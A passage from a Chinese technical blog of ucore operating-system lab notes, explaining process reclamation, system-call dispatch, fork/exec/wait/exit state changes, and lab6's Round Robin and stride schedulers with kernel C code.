<p>**3.**如果此子进程的执行状态为<code>PROC_ZOMBIE</code>，表明此子进程处于退出状态，需要当前进程（即子进程的父进程）完成对子进程的最终回收工作，即首先把子进程控制块从两个进程队列<code>proc_list</code>和<code>hash_list</code>中删除，并释放子进程的内核堆栈和进程控制块。自此，子进程才彻底地结束了它的执行过程，消除了它所占用的所有资源。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">local_intr_save(intr_flag);</span><br><span class="line">&#123;</span><br><span class="line">    unhash_proc(proc);</span><br><span class="line">    remove_links(proc);</span><br><span class="line">&#125;</span><br><span class="line">local_intr_restore(intr_flag);</span><br><span class="line">put_kstack(proc);</span><br><span class="line">kfree(proc);</span><br></pre></td></tr></table></figure>
<h1 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h1><p>系统调用为用户进程提供操作系统服务的统一接口层，简化用户的实现。</p>
<h2 id="初始化中断向量描述符"><a href="#初始化中断向量描述符" class="headerlink" title="初始化中断向量描述符"></a>初始化中断向量描述符</h2><p>在ucore的<code>kern_init</code>中调用了<code>idt_init</code>来初始化中断向量描述符表，并设置专门用于用户进程访问系统调用的中断门。</p>
<p><code>idt_init</code>部分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void</span><br><span class="line">idt_init(void) &#123;</span><br><span class="line">    extern uintptr_t __vectors[];</span><br><span class="line">    int i;</span><br><span class="line">    for (i &#x3D; 0; i &lt; sizeof(idt) &#x2F; sizeof(struct gatedesc); i ++) &#123;</span><br><span class="line">        SETGATE(idt[i], 0, GD_KTEXT, __vectors[i], DPL_KERNEL);</span><br><span class="line">    &#125;</span><br><span class="line">    SETGATE(idt[T_SYSCALL], 1, GD_KTEXT, __vectors[T_SYSCALL], DPL_USER);</span><br><span class="line">    lidt(&amp;idt_pd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一旦用户执行<code>int 0x80</code> 后，CPU从用户态切换到内核态，保存相关寄存器并跳转到对应的中断服务例程处执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vector128(vectors.S)--&gt;__alltraps(trapentry.S)--&gt;trap(trap.c)--&gt;trap_dispatch(trap.c)----&gt;syscall(syscall.c)</span><br></pre></td></tr></table></figure>
<h2 id="建立系统调用的用户库准备"><a href="#建立系统调用的用户库准备" class="headerlink" title="建立系统调用的用户库准备"></a>建立系统调用的用户库准备</h2><p>用户态的<code>syscall</code>如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static inline int</span><br><span class="line">syscall(int num, ...) &#123;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, num);</span><br><span class="line">    uint32_t a[MAX_ARGS];</span><br><span class="line">    int i, ret;</span><br><span class="line">    for (i &#x3D; 0; i &lt; MAX_ARGS; i ++) &#123;</span><br><span class="line">        a[i] &#x3D; va_arg(ap, uint32_t);</span><br><span class="line">    &#125;</span><br><span class="line">    va_end(ap);</span><br><span class="line"></span><br><span class="line">    asm volatile (</span><br><span class="line">        &quot;int %1;&quot;</span><br><span class="line">        : &quot;&#x3D;a&quot; (ret)</span><br><span class="line">        : &quot;i&quot; (T_SYSCALL),</span><br><span class="line">          &quot;a&quot; (num),</span><br><span class="line">          &quot;d&quot; (a[0]),</span><br><span class="line">          &quot;c&quot; (a[1]),</span><br><span class="line">          &quot;b&quot; (a[2]),</span><br><span class="line">          &quot;D&quot; (a[3]),</span><br><span class="line">          &quot;S&quot; (a[4])</span><br><span class="line">        : &quot;cc&quot;, &quot;memory&quot;);</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>eax中存放系统调用号</li>
<li>edx、ecx、ebx、edi、esi中按照顺序存放前五个参数</li>
<li>返回值存放在eax中</li>
</ul>
<p>应用程序调用的<code>exit/fork/wait/getpid</code>等库函数最后都会调用syscall函数，只是调用参数不同而已。</p>
<p>内核态的<code>syscall</code>为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void</span><br><span class="line">syscall(void) &#123;</span><br><span class="line">    struct trapframe *tf &#x3D; current-&gt;tf;</span><br><span class="line">    uint32_t arg[5];</span><br><span class="line">    int num &#x3D; tf-&gt;tf_regs.reg_eax;</span><br><span class="line">    if (num &gt;&#x3D; 0 &amp;&amp; num &lt; NUM_SYSCALLS) &#123;</span><br><span class="line">        if (syscalls[num] !&#x3D; NULL) &#123;</span><br><span class="line">            arg[0] &#x3D; tf-&gt;tf_regs.reg_edx;</span><br><span class="line">            arg[1] &#x3D; tf-&gt;tf_regs.reg_ecx;</span><br><span class="line">            arg[2] &#x3D; tf-&gt;tf_regs.reg_ebx;</span><br><span class="line">            arg[3] &#x3D; tf-&gt;tf_regs.reg_edi;</span><br><span class="line">            arg[4] &#x3D; tf-&gt;tf_regs.reg_esi;</span><br><span class="line">            tf-&gt;tf_regs.reg_eax &#x3D; syscalls[num](arg);</span><br><span class="line">            return ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    print_trapframe(tf);</span><br><span class="line">    panic(&quot;undefined syscall %d, pid &#x3D; %d, name &#x3D; %s.\n&quot;,</span><br><span class="line">            num, current-&gt;pid, current-&gt;name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，传递参数的顺序和用户态syscall的顺序一致。</p>
<h1 id="进程执行-fork-exec-wait-exit"><a href="#进程执行-fork-exec-wait-exit" class="headerlink" title="进程执行 fork/exec/wait/exit"></a>进程执行 fork/exec/wait/exit</h1><h2 id="父进程复制自己的内存空间给子进程"><a href="#父进程复制自己的内存空间给子进程" class="headerlink" title="父进程复制自己的内存空间给子进程"></a>父进程复制自己的内存空间给子进程</h2><p>创建子进程的函数<code>do_fork</code>在执行中将拷贝当前进程（即父进程）的用户内存地址空间中的合法内容到新进程中（子进程），完成内存资源的复制。具体是通过<code>copy_range</code>函数（位于<code>kern/mm/pmm.c</code>中）实现的，请补充<code>copy_range</code>的实现，确保能够正确执行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">copy_range(<span class="keyword">pde_t</span> *to, <span class="keyword">pde_t</span> *from, <span class="keyword">uintptr_t</span> start, <span class="keyword">uintptr_t</span> end, <span class="keyword">bool</span> share) &#123;</span><br><span class="line">    assert(start % PGSIZE == <span class="number">0</span> &amp;&amp; end % PGSIZE == <span class="number">0</span>);</span><br><span class="line">    assert(USER_ACCESS(start, end));</span><br><span class="line">    <span class="comment">//以页为单元进行复制</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//call get_pte to find process A&#x27;s pte according to the addr start</span></span><br><span class="line">        <span class="keyword">pte_t</span> *ptep = get_pte(from, start, <span class="number">0</span>), *nptep;</span><br><span class="line">        <span class="keyword">if</span> (ptep == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            start = ROUNDDOWN(start + PTSIZE, PTSIZE);</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//call get_pte to find process B&#x27;s pte according to the addr start. If pte is NULL, just alloc a PT</span></span><br><span class="line">        <span class="keyword">if</span> (*ptep &amp; PTE_P) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((nptep = get_pte(to, start, <span class="number">1</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">uint32_t</span> perm = (*ptep &amp; PTE_USER);</span><br><span class="line">        <span class="comment">//get page from ptep</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> pte2page(*ptep);</span><br><span class="line">        <span class="comment">// alloc a page for process B</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">npage</span>=</span>alloc_page();</span><br><span class="line">        assert(page!=<span class="literal">NULL</span>);</span><br><span class="line">        assert(npage!=<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//memcopy传入参数为void*类型，故二者均初始化为void *类型</span></span><br><span class="line">		<span class="keyword">void</span>* src_kvaddr=page2kva(page);</span><br><span class="line">		<span class="keyword">void</span>* dst_kvaddr=page2kva(npage);</span><br><span class="line">		<span class="built_in">memcpy</span>(dst_kvaddr, src_kvaddr, PGSIZE);</span><br><span class="line">		ret = page_insert(to, npage, start, perm);</span><br><span class="line">        assert(ret == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        start += PGSIZE;</span><br><span class="line">    &#125; <span class="keyword">while</span> (start != <span class="number">0</span> &amp;&amp; start &lt; end);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>请分析fork/exec/wait/exit在实现中是如何影响进程的执行状态的？</p>
</blockquote>
<ul>
<li><p><code>do_fork</code>  调用<code>alloc_proc</code>后进程状态为 <code>UNINIT</code>，然后将原进程信息复制过去，再覆盖原来的内核栈、eax、esp、eflags。调用函数 <code>wakeup_proc</code> 之后进程状态为RUNNABLE。</p>
</li>
<li><p><code>do_execve</code> 清除当前内存布局，再调用<code>load_icode</code>从二进制elf文件中读入内存布局，进程的状态不发生改变。</p>
</li>
<li><p><code>do_wait</code> 当前进程无子进程时错误退出，若有子进程，则判定子进程的状态是否为则判定是否为ZOMBIE 。若是则释放子进程的资源，并返回子进程的退出状态码。</p>
</li>
<li><p><code>do_exit</code> 首先清除当前进程除内核栈和进程控制块以外的资源，状态设置为ZOMBIE。若存在正在等待的父进程则唤醒父进程，父进程的状态从 SLEEPING 转变为 RUNNABLE。随后将该进程所有的子进程的父进程设置为<code>initproc</code>，由initproc进行资源的回收。若<code>initproc</code>正在等待子进程，则唤醒<code>initproc</code>。</p>
</li>
</ul>
<blockquote>
<p>请给出ucore中一个用户态进程的执行状态生命周期图</p>
</blockquote>
<p>proc中的用户态进程执行状态生命周期图如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">alloc_proc                                 RUNNING</span><br><span class="line">      +                                   +--&lt;----&lt;--+</span><br><span class="line">      +                                   + proc_run +</span><br><span class="line">      V                                   +--&gt;----&gt;--+</span><br><span class="line">PROC_UNINIT -- proc_init/wakeup_proc --&gt; PROC_RUNNABLE -- try_free_pages/do_wait/do_sleep --&gt; PROC_SLEEPING --</span><br><span class="line">                                           A      +                                                           +</span><br><span class="line">                                           |      +--- do_exit --&gt; PROC_ZOMBIE                                +</span><br><span class="line">                                           +                                                                  +</span><br><span class="line">                                           -----------------------wakeup_proc----------------------------------</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>ucore</tag>
      </tags>
  </entry>
  <entry>
    <title>ucore lab6</title>
    <url>/systems/ucore-lab6/</url>
    <content><![CDATA[<p>lab5完成了用户进程的管理，可在用户态运行多个进程。但是lab5所采用的调度策略为简单的FIFO策略，未考虑到进程的特征，性能比较差。lab 6对ucore的调度部分进行了修改，设计了系统调度器框架，不涉及具体的调度算法。之后，ucore基于此框架实现了RR调度算法。另外，考虑到进程优先级的问题，又引入了stride调度算法。</p>
<a id="more"></a>

<blockquote>
<p>填写已有实验</p>
</blockquote>
<p>本实验依赖实验1/2/3/4/5。请把你做的实验2/3/4/5的代码填入本实验中代码中有“LAB1”/“LAB2”/“LAB3”/“LAB4”“LAB5”的注释相应部分。并确保编译通过。注意：为了能够正确执行lab6的测试应用程序，可能需对已完成的实验1/2/3/4/5的代码进行进一步改进。<br>由于<code>proc</code>数据结构有所扩展，所以在<code>proc.c</code>中<code>alloc_proc</code>初始化需添加以下内容</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *<span class="title">alloc_proc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    proc-&gt;rq = <span class="literal">NULL</span>;<span class="comment">//进程所属运行队列</span></span><br><span class="line">    list_init(&amp;(proc-&gt;run_link));<span class="comment">//运行队列的哨兵结构</span></span><br><span class="line">    proc-&gt;time_slice = <span class="number">0</span>;<span class="comment">//进程时间片</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在响应时钟中断时让操作系统感知操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:</span><br><span class="line">        ticks ++;</span><br><span class="line">        assert(current != <span class="literal">NULL</span>);</span><br><span class="line">        sched_class_proc_tick(current);<span class="comment">//设置当前进程的调度状态</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>在之前的ucore中，中断时调用<code>run_timer_list</code>，先检查<code>timer_list</code>中的进程时间是否到期，若到期则唤醒该进程，若没有则expires–;再调用<code>sche_proc_proc_tick</code>设置当前进程的调度状态。进程如果需要等待一段时间后再唤醒，则需要用到timer结构，timer记录唤醒的时间，每次中断时从timer_list中查找到期的进程进行唤醒。让人奇怪的在于,之前的ucore中定义了timer的数据结构，以及对应的函数，却没有什么进程会面临这种情况。现在的ucore只是简单初始化<code>timer_list</code>,后续也并没有使用到此数据结构。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// the list of timer</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">list_entry_t</span> timer_list;</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">sched_init(<span class="keyword">void</span>) &#123;</span><br><span class="line">    list_init(&amp;timer_list);</span><br><span class="line"></span><br><span class="line">    sched_class = &amp;default_sched_class;</span><br><span class="line"></span><br><span class="line">    rq = &amp;__rq;</span><br><span class="line">    rq-&gt;max_time_slice = MAX_TIME_SLICE;</span><br><span class="line">    sched_class-&gt;init(rq);</span><br><span class="line"></span><br><span class="line">    cprintf(<span class="string">&quot;sched class: %s\n&quot;</span>, sched_class-&gt;name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h1><p>进程调度算法涉及到进程状态的转换。在ucore的具体实现中，进程控制块结构<code>proc_struct</code> 中成员变量<code>state</code> 用于描述进程的运行状态。其中运行态和就绪态的状态值相同，均为<code>PROC_RUNNABLE</code> ,二者区别在于运行态的进程不会放在运行队列中。</p>
<p>进程的正常生命周期如下：</p>
<ol>
<li>进程首先在cpu初始化或sys_fork的时候被创建，当为该进程分配了一个进程控制块之后，该进程进入uninit态。</li>
<li>当进程完全初始化后，该进程转为runnable态</li>
<li>当到达调度点时，由调度器 sched_class 根据运行队列rq的内容来判断一个进程是否应该被运行，即把处于runnable态的进程转换成running状态，从而占用CPU执行。</li>
<li>running态的进程通过wait等系统调用被阻塞，进入sleeping态。</li>
<li>sleeping态的进程被wakeup变成runnable态的进程。</li>
<li>running态的进程主动 exit 变成zombie态，然后由其父进程完成对其资源的最后释放，子进程的进程控制块成为unused。</li>
<li>所有从runnable态变成其他状态的进程都要出运行队列，反之，被放入某个运行队列中。</li>
</ol>
<h1 id="进程调度实现"><a href="#进程调度实现" class="headerlink" title="进程调度实现"></a>进程调度实现</h1><h2 id="内核抢占点"><a href="#内核抢占点" class="headerlink" title="内核抢占点"></a>内核抢占点</h2><p>对于用户进程而言，中断的产生可以随时打断用户进程的执行，转到操作系统内部，从而操作系统拥有了调度控制权，可以选择其他用户执行，所以用户进程是可以抢占的。ucore内核执行同样是可抢占的，在执行任意内核代码时，cpu控制权可强制剥夺。</p>
<p>但是以下几种例外情况不可剥夺：</p>
<ul>
<li>进行同步互斥操作，比如争抢一个信号量、锁；</li>
<li>进行磁盘读写等耗时的异步操作，由于等待完成的耗时太长，ucore会调用schedule让其他就绪进程执行。</li>
</ul>
<p>以上情况都是由于当前进程所需的某个资源得不到满足而无法继续下去，不得不主动放弃对cpu的控制权。</p>
<blockquote>
<p>调度点</p>
</blockquote>
<p>lab6涉及到的调度点：</p>
<ul>
<li><code>proc.c:do_exit</code>　户线程执行结束，主动放弃CPU</li>
<li><code>proc.c:do_wait</code>　用户线程等待子进程结束，主动放弃CPU</li>
<li><code>proc.c::cpu_idle</code>　idleproc内核线程选取一个就绪进程并切换</li>
<li><code>trap.c::trap</code>　　若时间片用完，则设置need_resched为1，让当前进程放弃CPU</li>
</ul>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>在进程的执行过程中，就绪进程的等待时间和执行进程的执行时间是调度考虑的主要部分。这两者随着时间的流逝和时间的发生动态变化。为了让操作系统感知进程状态变化的情况，引入timer时间感知操作，在进程运行或等待的过程中，调度器可以调整进程控制块中与进程调度相关的属性值。</p>
<p>ucore调度框架定义了以下接口：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> &#123;</span></span><br><span class="line">    <span class="comment">// 调度器的名字</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="comment">//初始化运行队列</span></span><br><span class="line">    <span class="keyword">void</span> (*init)(struct run_queue *rq);</span><br><span class="line">    <span class="comment">//将进程p插入队列rq</span></span><br><span class="line">    <span class="keyword">void</span> (*enqueue)(struct run_queue *rq, struct proc_struct *proc);</span><br><span class="line">    <span class="comment">//将进程p从队列中删除</span></span><br><span class="line">    <span class="keyword">void</span> (*dequeue)(struct run_queue *rq, struct proc_struct *proc);</span><br><span class="line">    <span class="comment">//返回运行队列中下一个可执行的进程</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *(*<span class="title">pick_next</span>)(<span class="keyword">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>);</span></span><br><span class="line">    <span class="comment">// 时间处理</span></span><br><span class="line">    <span class="keyword">void</span> (*proc_tick)(struct run_queue *rq, struct proc_struct *proc);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>proc.h中的proc_struct中调度相关信息有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct proc_struct &#123;</span><br><span class="line">    &#x2F;&#x2F;该进程是否需要调度，只对当前进程有效</span><br><span class="line">    volatile bool need_resched;                 </span><br><span class="line">    &#x2F;&#x2F;运行队列</span><br><span class="line">    struct run_queue *rq;</span><br><span class="line">    &#x2F;&#x2F;该进程的调度链表结构</span><br><span class="line">    list_entry_t run_link;</span><br><span class="line">    &#x2F;&#x2F;该进程剩余的时间片，只对当前进程有效</span><br><span class="line">    int time_slice;</span><br><span class="line">    &#x2F;&#x2F;RR算法并不会用到以下成员</span><br><span class="line">    skew_heap_entry_t lab6_run_pool;</span><br><span class="line">    &#x2F;&#x2F;在优先队列中的节点</span><br><span class="line">    uint32_t lab6_stride;</span><br><span class="line">    &#x2F;&#x2F;该进程的调度优先级</span><br><span class="line">    uint32_t lab6_priority;</span><br><span class="line">    &#x2F;&#x2F;该进程的调度步进值</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>通过数据结构run_queue来描述run_queue,主要结构为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct run_queue &#123;</span><br><span class="line">    &#x2F;&#x2F;某运行队列的头或尾</span><br><span class="line">    list_entry_t run_list;</span><br><span class="line">    &#x2F;&#x2F;内部的进程总数</span><br><span class="line">    unsigned int proc_num;</span><br><span class="line">    &#x2F;&#x2F;每个进程一轮占用的最多时间</span><br><span class="line">    int max_time_slice;</span><br><span class="line">    &#x2F;&#x2F;优先队列形式的进程容器</span><br><span class="line">    skew_heap_entry_t *lab6_run_pool;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在ucore中，运行队列中存储当前可调度的进程，只有状态为runnable的进程才可以进入运行队列，其中当前正在运行的进程不会进入运行队列。</p>
<h1 id="Round-Robin调度算法"><a href="#Round-Robin调度算法" class="headerlink" title="Round Robin调度算法"></a>Round Robin调度算法</h1><p>RR调度算法的调度思想是让所有运行队列中的进程分时轮流使用CPU时间。当前进程的时间片用完之后，调度器将当前进程放置到运行队列的尾部，再从其头部取出进程进行调度。RR调度算法的就绪队列在组织结构上也是一个双向链表，只是增加了一个成员变量，表明在此就绪进程队列中的最大执行时间片。而且在进程控制块<code>proc_struct</code>中增加了一个成员变量<code>time_slice</code>，用来记录进程当前的可运行时间片段。在每个timer到期的时候，操作系统会递减当前执行进程的<code>time_slice</code>，当<code>time_slice</code>为0时，就意味着这个进程运行了一段时间（这个时间片段称为进程的时间片），需要把CPU让给其他进程执行，于是操作系统就需要让此进程重新回到rq的队列尾，且重置此进程的时间片为就绪队列的成员变量最大时间片<code>max_time_slice</code>值，然后再从rq的队列头取出一个新的进程执行。</p>
<p>RR调度算法具体实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">RR_enqueue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    assert(list_empty(&amp;(proc-&gt;run_link)));</span><br><span class="line">    list_add_before(&amp;(rq-&gt;run_list), &amp;(proc-&gt;run_link));</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) &#123;</span><br><span class="line">        proc-&gt;time_slice = rq-&gt;max_time_slice;</span><br><span class="line">    &#125;</span><br><span class="line">    proc-&gt;rq = rq;</span><br><span class="line">    rq-&gt;proc_num ++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>RR_enqueue把某进程的进程控制块指针放入到rq队列末尾，如果进程控制块时间片为0，则需要把它重置为rq成员变量max_time_slice，等待分配下一个时间片再运行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">FCFS_pick_next</span>(<span class="keyword">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>) &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_next(&amp;(rq-&gt;run_list));</span><br><span class="line">    <span class="keyword">if</span> (le != &amp;(rq-&gt;run_list)) &#123;</span><br><span class="line">        <span class="keyword">return</span> le2proc(le, run_link);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>RR_pick_next选区就绪进程队列rq中的队首队列元素，并根据队列元素找到对应的进程控制块。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">FCFS_dequeue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    assert(!list_empty(&amp;(proc-&gt;run_link)) &amp;&amp; proc-&gt;rq &#x3D;&#x3D; rq);</span><br><span class="line">    list_del_init(&amp;(proc-&gt;run_link));</span><br><span class="line">    rq-&gt;proc_num --;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>RR_dequeue把就绪进程队列rq的进程控制块指针的队列元素删除，并把表示就绪进程个数的proc_num减一。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">RR_proc_tick(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    if (proc-&gt;time_slice &gt; 0) &#123;</span><br><span class="line">        proc-&gt;time_slice --;</span><br><span class="line">    &#125;</span><br><span class="line">    if (proc-&gt;time_slice &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        proc-&gt;need_resched &#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每次timer到时后，trap函数将会间接调用<code>RR_proc_tick</code>来把当前执行进程的时间片time_slice减一。如果time_slice降到零，则设置此进程成员变量<code>need_resched</code>标识为1，这样在下一次中断来后执行trap函数时，会由于当前进程程成员变量<code>need_resched</code>标识为1而执行schedule函数，从而把当前执行进程放回就绪队列末尾，而从就绪队列头取出在就绪队列上等待时间最久的那个就绪进程执行。</p>
<blockquote>
<p>sched_class中各个函数指针的用法</p>
</blockquote>
<ul>
<li><strong>init</strong> 初始化运行队列的参数。</li>
<li>**enqueue ** 将可调度的进程放入调度队列</li>
<li><strong>dequeue</strong> 将该进程从调度队列删除</li>
<li><strong>pick_next</strong>  根据调度策略选择下一个进程</li>
<li><strong>proc_tick</strong>响应时钟中断，减少当前进程时间片，若为0则重新调度</li>
</ul>
<blockquote>
<p>ucore的调度过程：</p>
</blockquote>
<ol>
<li>设置当前进程剩余时间片</li>
<li>每次时钟中断，当前进程剩余时间片减一</li>
<li>剩余时间片为0时，会将当前进程的 <code>need_resched</code> 设置为1</li>
<li>从trap函数可知，在<code>trap_dispatch</code>之后，由于<code>need_resched</code> = 1，因此进入schedule进入调度器<br>将当前进程加入到数据结构中，并且取出数据结构中优先级最高的进程。</li>
</ol>
<ul>
<li>若<code>sched_class_pick_next</code>返回不为null，则选择该进程</li>
<li>若<code>sched_class_pick_next</code>返回为null，则设置下一进程为idleproc，idleproc死循环查找可被调度的进程</li>
</ul>
<ol start="5">
<li>调用 <code>proc_run()</code> 进行进程切换</li>
</ol>
<blockquote>
<p>设计实现多级反馈队列调度算法</p>
</blockquote>
<p>多级反馈队列算法初步设计如下：</p>
<ul>
<li><strong>init</strong>  初始化所有队列，将优先级设置为最高</li>
<li><strong>enqueue</strong> 该进程时间片为0时判断进程是否处于zombie状态，若不是，则降低有限级放入对应队列中，将时间片设置为该优先级队列的时间片</li>
<li><strong>dequeue</strong> 将该进程从对应优先级调度队列删除</li>
<li><strong>pick_next</strong> 根据优先级算法啊判断是否需要转移队列</li>
<li><strong>proc_tick</strong> 与之前实现一致</li>
</ul>
<h1 id="Stride-调度算法"><a href="#Stride-调度算法" class="headerlink" title="Stride 调度算法"></a>Stride 调度算法</h1><p>RR算法所有进程得到的时间是相等的，而我们希望每个进程得到的时间资源与其优先级成正比关系，由此引入了<strong>Stride Scheduling</strong>算法。</p>
<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><p>基本思想如下：</p>
<ol>
<li>为每个runnable的进程设置一个当前状态stride，表示该进程当前的调度权。另外定义其对应的pass值，表示对应进程在调度后，stride 需要进行的累加值。</li>
<li>每次需要调度时，从当前 runnable 态的进程中选择 stride最小的进程调度。</li>
<li>对于获得调度的进程P，将对应的stride加上其对应的步长pass（只与进程的优先权有关系）。</li>
<li>在一段固定的时间之后，回到 2.步骤，重新调度当前stride最小的进程。</li>
</ol>
<h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><p>stride调度算法为动态优先级调度算法，线程的执行时间与步进值的倒数成正比，简单易于实现。</p>
<ul>
<li><strong>可控性</strong> 可以证明stride scheduling对进程的调度次数正比于其优先级</li>
<li><strong>确定性</strong> 在不考虑计时器时间的情况下，整个调度机制都是可预知和可实现的</li>
</ul>
<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>Stride Scheduling 需要用到<code>proc_struct</code>中的几个成员变量，在<code>alloc_proc</code>中再添加初始化部分如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">proc-&gt;lab6_run_pool.parent = proc-&gt;lab6_run_pool.left = proc-&gt;lab6_run_pool.right = <span class="literal">NULL</span>;</span><br><span class="line">proc-&gt;lab6_priority = <span class="number">0</span>;<span class="comment">//优先级</span></span><br><span class="line">proc-&gt;lab6_stride = <span class="number">0</span>;<span class="comment">//步进值</span></span><br></pre></td></tr></table></figure>
<p><strong>Stride Scheduling</strong>的具体实现在<code>alloc_proc</code>中。</p>
<p>首先定义BIG_STRIDE的值为0x7FFFFFFF,即32位有符号整数中最大的整数的表示形式。步进值定义为 <code>P.pass =BigStride/P.priority</code> ， 其中 <code>P.priority</code> 表示进程的优先权（大于 1），而 BigStride 表示一个预先定义的大常数，则该调度方案为每个进程分配的时间将与其优先级成正比。<code>STRIDE_MAX-STRIDE_MIN&lt;=BIG_STRIDE</code>，为了使溢出次数尽可能少，同时保证对于任意两个Stride差值在32位有符号整数的表示范围内，将BIGSTRIDE取为32位有符号整数中的最大值，。</p>
<p>stride值在累加过程中很可能会溢出，为了避免溢出导致比较失败，stride scheduling采取无符号数来解决此问题。piazza上相关的讨论摘录如下：</p>
<p>设置无符号整数ab作为两个stride<br>假设开始的时候a=b，之后b先增加。如果b没有溢出，此时a-b&lt;0，之后应该轮到a增加，此时是成功的。</p>
<p>如果b溢出，首先看到<code>schedule/default_sched.c</code>中有一句 <code>#define BIG_STRIDE 0x7FFFFFFF</code>，因为stride每次的增量都是 <code>BIG_STRIDE / priority</code>，所以stride每次最大的增量不会超过<code>BIG_STRIDE</code> 。</p>
<p>在加上步进值以后b溢出了，那么b之前必然大于<code>0x7FFFFFFF</code>,和一个小于<code>0x7FFFFFFF</code>的数相加才会溢出。在b溢出之后，无符号表示中，a仍为原来的值，而b会小于<code>0x7FFFFFFF</code>。a-b无符号大于<code>0x7FFFFFFF</code>（因为b的步进值小于<code>0x7FFFFFFF</code>），也就是有符号小于0，仍然是成功的。</p>
<p>所以问题的关键就在于<code>#define BIG_STRIDE 0x7FFFFFFF</code><br>这个值必须是有符号整数的最大值，这个是保证stride不会出错的原因<br>举个例子，把BIG_STRIDE增大，BIG_STRIDE=0xE0000000<br>那么初始令a=b=0xE0000000，b先前进0xE0000000，b变为0xC0000000​，此时就有a-b&gt;0，stride算法就错了。</p>
<blockquote>
